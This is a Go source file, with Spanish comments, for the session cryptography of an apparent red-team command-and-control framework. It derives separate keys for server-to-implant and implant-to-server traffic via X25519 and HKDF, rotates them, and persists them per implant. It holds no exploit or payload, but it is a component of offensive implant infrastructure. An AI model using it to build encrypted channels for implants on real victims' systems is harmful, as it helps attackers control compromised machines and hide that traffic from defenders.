package crypto

import (
	"context"
	"crypto/ecdh"
	"crypto/rand"
	"errors"
	"fmt"
	"sync"

	"github.com/google/uuid"
)

// SessionCrypto gestiona el cifrado bidireccional de una sesión concreta.
//
// Usa dos claves independientes derivadas vía HKDF:
//   - c2ToBeacon: cifra lo que el C2 envía al implante
//   - beaconToC2: cifra lo que el implante envía al C2
//
// Los métodos de cifrado/descifrado toman una COPIA de la clave bajo RLock
// antes de usarla, para que ApplyRekey* pueda zerear y reemplazar las
// claves antiguas sin race con lectores concurrentes.
type SessionCrypto struct {
	mu sync.RWMutex

	// Claves bidireccionales (AES-256)
	c2ToBeacon []byte
	beaconToC2 []byte

	// Control de rotación
	msgCount   uint64
	rekeyEvery uint64
}

// NewSessionCrypto crea una sesión criptográfica desde ECDH en el lado server.
//
// El `sessionKey` (ej: "a1b2c3...") actúa como contexto de HKDF y garantiza
// que dos sesiones con el mismo par de claves produzcan claves distintas.
func NewSessionCrypto(
	serverPriv *ecdh.PrivateKey,
	implantPub *ecdh.PublicKey,
	sessionKey string,
) (*SessionCrypto, error) {
	if serverPriv == nil || implantPub == nil {
		return nil, errors.New("crypto: claves ECDH requeridas")
	}
	if sessionKey == "" {
		return nil, errors.New("crypto: sessionKey requerido")
	}

	c2ToBeacon, err := DeriveSharedKey(serverPriv, implantPub,
		[]byte("rtc2-c2-to-beacon-"+sessionKey))
	if err != nil {
		return nil, fmt.Errorf("crypto: derivar c2→beacon: %w", err)
	}

	beaconToC2, err := DeriveSharedKey(serverPriv, implantPub,
		[]byte("rtc2-beacon-to-c2-"+sessionKey))
	if err != nil {
		return nil, fmt.Errorf("crypto: derivar beacon→c2: %w", err)
	}

	return &SessionCrypto{
		c2ToBeacon: c2ToBeacon,
		beaconToC2: beaconToC2,
		rekeyEvery: 1000,
	}, nil
}

// NewSessionCryptoAsBeacon crea una sesión criptográfica desde el punto de
// vista del implante. Es la contraparte de NewSessionCrypto: recibe la clave
// privada del implante y la pública del server, pero deriva exactamente las
// mismas claves porque ECDH es simétrico y los info strings de HKDF coinciden.
//
// El implante debe usar:
//   - EncryptForC2    → para enviar al C2
//   - DecryptFromC2   → para recibir del C2
func NewSessionCryptoAsBeacon(
	implantPriv *ecdh.PrivateKey,
	serverPub *ecdh.PublicKey,
	sessionKey string,
) (*SessionCrypto, error) {
	if implantPriv == nil || serverPub == nil {
		return nil, errors.New("crypto: claves ECDH requeridas")
	}
	if sessionKey == "" {
		return nil, errors.New("crypto: sessionKey requerido")
	}

	c2ToBeacon, err := DeriveSharedKey(implantPriv, serverPub,
		[]byte("rtc2-c2-to-beacon-"+sessionKey))
	if err != nil {
		return nil, fmt.Errorf("crypto: derivar c2→beacon: %w", err)
	}

	beaconToC2, err := DeriveSharedKey(implantPriv, serverPub,
		[]byte("rtc2-beacon-to-c2-"+sessionKey))
	if err != nil {
		return nil, fmt.Errorf("crypto: derivar beacon→c2: %w", err)
	}

	return &SessionCrypto{
		c2ToBeacon: c2ToBeacon,
		beaconToC2: beaconToC2,
		rekeyEvery: 1000,
	}, nil
}

// NewSessionCryptoFromKeys construye un SessionCrypto desde claves ya
// derivadas (por ejemplo, cargadas desde la tabla session_keys tras un
// reinicio del team server).
func NewSessionCryptoFromKeys(c2ToBeacon, beaconToC2 []byte, msgCount, rekeyEvery uint64) (*SessionCrypto, error) {
	if len(c2ToBeacon) != KeySize || len(beaconToC2) != KeySize {
		return nil, errors.New("crypto: claves deben ser de 32 bytes")
	}
	if rekeyEvery == 0 {
		rekeyEvery = 1000
	}
	return &SessionCrypto{
		c2ToBeacon: c2ToBeacon,
		beaconToC2: beaconToC2,
		msgCount:   msgCount,
		rekeyEvery: rekeyEvery,
	}, nil
}

// Todos estos métodos toman una copia de la clave bajo RLock. Es la pieza
// clave que elimina el race con ApplyRekey*: aunque ApplyRekey* zeree y
// reemplace los slices, el lector ya trabaja sobre su propia copia.

func (sc *SessionCrypto) EncryptForBeacon(plaintext []byte, aad []byte) ([]byte, error) {
	key := sc.snapshot(&sc.c2ToBeacon)
	return Encrypt(key, plaintext, aad)
}

func (sc *SessionCrypto) DecryptFromBeacon(blob []byte, aad []byte) ([]byte, error) {
	key := sc.snapshot(&sc.beaconToC2)
	return Decrypt(key, blob, aad)
}

func (sc *SessionCrypto) EncryptForC2(plaintext []byte, aad []byte) ([]byte, error) {
	key := sc.snapshot(&sc.beaconToC2)
	return Encrypt(key, plaintext, aad)
}

func (sc *SessionCrypto) DecryptFromC2(blob []byte, aad []byte) ([]byte, error) {
	key := sc.snapshot(&sc.c2ToBeacon)
	return Decrypt(key, blob, aad)
}

// snapshot devuelve una copia del slice apuntado por p, tomada bajo RLock.
// El slice de salida tiene siempre KeySize bytes.
func (sc *SessionCrypto) snapshot(p *[]byte) []byte {
	sc.mu.RLock()
	defer sc.mu.RUnlock()
	out := make([]byte, KeySize)
	copy(out, *p)
	return out
}

// ShouldRekey indica si es momento de rotar la clave.
func (sc *SessionCrypto) ShouldRekey() bool {
	sc.mu.RLock()
	defer sc.mu.RUnlock()
	return sc.msgCount >= sc.rekeyEvery
}

// IncrementMsg incrementa el contador de mensajes y devuelve el nuevo valor.
func (sc *SessionCrypto) IncrementMsg() uint64 {
	sc.mu.Lock()
	defer sc.mu.Unlock()
	sc.msgCount++
	return sc.msgCount
}

// MsgCount devuelve el contador actual de mensajes.
func (sc *SessionCrypto) MsgCount() uint64 {
	sc.mu.RLock()
	defer sc.mu.RUnlock()
	return sc.msgCount
}

// ApplyRekeyAsServer deriva nuevas claves en el lado server a partir de:
//
//	ECDH(serverEphPriv, implantEphPub)
//
// donde serverEphPriv es la clave efímera generada al iniciar el rekey, y
// implantEphPub es la clave efímera que el implante envía en su respuesta.
//
// Al terminar, las claves antiguas se zeran y msgCount se resetea a 0.
func (sc *SessionCrypto) ApplyRekeyAsServer(
	serverEphPriv *ecdh.PrivateKey,
	implantEphPub *ecdh.PublicKey,
) error {
	if serverEphPriv == nil || implantEphPub == nil {
		return errors.New("crypto: rekey: claves ECDH requeridas")
	}
	secret, err := serverEphPriv.ECDH(implantEphPub)
	if err != nil {
		return fmt.Errorf("crypto: rekey ECDH: %w", err)
	}
	return sc.applyRekeyFromSecret(secret)
}

// ApplyRekeyAsBeacon deriva nuevas claves en el lado implante a partir de:
//
//	ECDH(implantEphPriv, serverEphPub)
func (sc *SessionCrypto) ApplyRekeyAsBeacon(
	implantEphPriv *ecdh.PrivateKey,
	serverEphPub *ecdh.PublicKey,
) error {
	if implantEphPriv == nil || serverEphPub == nil {
		return errors.New("crypto: rekey: claves ECDH requeridas")
	}
	secret, err := implantEphPriv.ECDH(serverEphPub)
	if err != nil {
		return fmt.Errorf("crypto: rekey ECDH: %w", err)
	}
	return sc.applyRekeyFromSecret(secret)
}

// applyRekeyFromSecret deriva las dos claves nuevas desde el secreto ECDH
// efímero y reemplaza las actuales de forma atómica.
//
// Los info strings son fijos (no incluyen el sessionKey) porque la entropía
// viene del ECDH efímero: cada rekey produce un secreto distinto incluso
// reutilizando los mismos extremos. Esto permite que NewSessionCryptoFromKeys
// (que no conoce el sessionKey) pueda participar en el rekey.
func (sc *SessionCrypto) applyRekeyFromSecret(secret []byte) error {
	newC2ToBeacon, err := deriveKey(secret, nil, []byte("rtc2-rekey-c2-to-beacon"))
	if err != nil {
		return err
	}
	newBeaconToC2, err := deriveKey(secret, nil, []byte("rtc2-rekey-beacon-to-c2"))
	if err != nil {
		return err
	}

	sc.mu.Lock()
	defer sc.mu.Unlock()
	// Seguro: los lectores toman una copia bajo RLock y usan la copia;
	// el escritor tiene el Lock, así que ningún lector está tocando los
	// slices en este momento.
	SecureZero(sc.c2ToBeacon)
	SecureZero(sc.beaconToC2)
	sc.c2ToBeacon = newC2ToBeacon
	sc.beaconToC2 = newBeaconToC2
	sc.msgCount = 0
	return nil
}

// Keys devuelve copias de las claves actuales para persistencia.
func (sc *SessionCrypto) Keys() (c2ToBeacon, beaconToC2 []byte, msgCount, rekeyEvery uint64) {
	sc.mu.RLock()
	defer sc.mu.RUnlock()
	c2 := make([]byte, len(sc.c2ToBeacon))
	bc := make([]byte, len(sc.beaconToC2))
	copy(c2, sc.c2ToBeacon)
	copy(bc, sc.beaconToC2)
	return c2, bc, sc.msgCount, sc.rekeyEvery
}

// GenerateRekeyPayload genera un nuevo par efímero X25519 para iniciar un
// rekey. Devuelve los bytes crudos (32 bytes cada uno); el caller decide
// cómo codificarlos.
func GenerateRekeyPayload() (privateKeyBytes, publicKeyBytes []byte, err error) {
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, nil, err
	}
	return priv.Bytes(), priv.PublicKey().Bytes(), nil
}

// SessionKeyRepo es la interfaz de persistencia para SessionCryptoStore.
type SessionKeyRepo interface {
	Save(ctx context.Context, implantID uuid.UUID, c2ToBeacon, beaconToC2 []byte, msgCount, rekeyEvery uint64) error
	Load(ctx context.Context, implantID uuid.UUID) (c2ToBeacon, beaconToC2 []byte, msgCount, rekeyEvery uint64, err error)
	Delete(ctx context.Context, implantID uuid.UUID) error
}

// SessionCryptoStore mantiene las sesiones criptográficas activas y, en el
// lado server, el estado intermedio de los rekeys en curso.
type SessionCryptoStore struct {
	mu       sync.RWMutex
	sessions map[uuid.UUID]*SessionCrypto

	// pendingRekeys: entre que el server envía MsgKeyRotation y recibe la
	// respuesta del implante con su ephPub, guardamos aquí la ephPriv del
	// server. Solo aplica al server.
	pendingRekeys map[uuid.UUID]*ecdh.PrivateKey

	// Persistencia opcional
	repo SessionKeyRepo
}

func NewSessionCryptoStore() *SessionCryptoStore {
	return &SessionCryptoStore{
		sessions:      make(map[uuid.UUID]*SessionCrypto),
		pendingRekeys: make(map[uuid.UUID]*ecdh.PrivateKey),
	}
}

func NewSessionCryptoStoreWithRepo(repo SessionKeyRepo) *SessionCryptoStore {
	return &SessionCryptoStore{
		sessions:      make(map[uuid.UUID]*SessionCrypto),
		pendingRekeys: make(map[uuid.UUID]*ecdh.PrivateKey),
		repo:          repo,
	}
}

func (s *SessionCryptoStore) Set(ctx context.Context, implantID uuid.UUID, sc *SessionCrypto) error {
	s.mu.Lock()
	s.sessions[implantID] = sc
	s.mu.Unlock()

	if s.repo != nil {
		c2, bc, msgCount, rekeyEvery := sc.Keys()
		if err := s.repo.Save(ctx, implantID, c2, bc, msgCount, rekeyEvery); err != nil {
			return fmt.Errorf("crypto: persistir session keys: %w", err)
		}
	}
	return nil
}

func (s *SessionCryptoStore) Get(ctx context.Context, implantID uuid.UUID) (*SessionCrypto, bool) {
	s.mu.RLock()
	sc, ok := s.sessions[implantID]
	s.mu.RUnlock()
	if ok {
		return sc, true
	}

	if s.repo == nil {
		return nil, false
	}

	c2, bc, msgCount, rekeyEvery, err := s.repo.Load(ctx, implantID)
	if err != nil || len(c2) == 0 {
		return nil, false
	}

	loaded, err := NewSessionCryptoFromKeys(c2, bc, msgCount, rekeyEvery)
	if err != nil {
		return nil, false
	}

	s.mu.Lock()
	s.sessions[implantID] = loaded
	s.mu.Unlock()
	return loaded, true
}

func (s *SessionCryptoStore) Delete(ctx context.Context, implantID uuid.UUID) error {
	s.mu.Lock()
	if sc, ok := s.sessions[implantID]; ok {
		c2, bc, _, _ := sc.Keys()
		SecureZero(c2)
		SecureZero(bc)
		delete(s.sessions, implantID)
	}
	delete(s.pendingRekeys, implantID)
	s.mu.Unlock()

	if s.repo != nil {
		if err := s.repo.Delete(ctx, implantID); err != nil {
			return fmt.Errorf("crypto: eliminar session keys: %w", err)
		}
	}
	return nil
}

func (s *SessionCryptoStore) Save(ctx context.Context, implantID uuid.UUID) error {
	if s.repo == nil {
		return nil
	}
	s.mu.RLock()
	sc, ok := s.sessions[implantID]
	s.mu.RUnlock()
	if !ok {
		return fmt.Errorf("crypto: sesión %s no encontrada", implantID)
	}
	c2, bc, msgCount, rekeyEvery := sc.Keys()
	return s.repo.Save(ctx, implantID, c2, bc, msgCount, rekeyEvery)
}

func (s *SessionCryptoStore) SetPendingRekey(implantID uuid.UUID, ephPriv *ecdh.PrivateKey) {
	s.mu.Lock()
	s.pendingRekeys[implantID] = ephPriv
	s.mu.Unlock()
}

func (s *SessionCryptoStore) TakePendingRekey(implantID uuid.UUID) *ecdh.PrivateKey {
	s.mu.Lock()
	defer s.mu.Unlock()
	eph := s.pendingRekeys[implantID]
	delete(s.pendingRekeys, implantID)
	return eph
}

func (s *SessionCryptoStore) List() []uuid.UUID {
	s.mu.RLock()
	defer s.mu.RUnlock()
	ids := make([]uuid.UUID, 0, len(s.sessions))
	for id := range s.sessions {
		ids = append(ids, id)
	}
	return ids
}
